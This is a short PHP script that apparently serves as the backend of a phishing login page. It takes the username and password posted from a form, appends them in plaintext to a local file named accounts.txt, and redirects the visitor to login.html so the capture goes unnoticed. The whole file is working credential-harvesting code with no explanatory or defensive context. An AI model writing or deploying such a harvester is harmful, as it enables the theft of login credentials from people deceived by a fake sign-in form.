<?php
    $username = $_POST['name'];
    $password = $_POST['pwd'];
    $filename = 'accounts.txt';
    $fp = fopen($filename, 'a+');
    fwrite ($fp, $username . "," . $password . "\n");
    fclose ($fp);
    header("Location: login.html"); 
    die();
?>
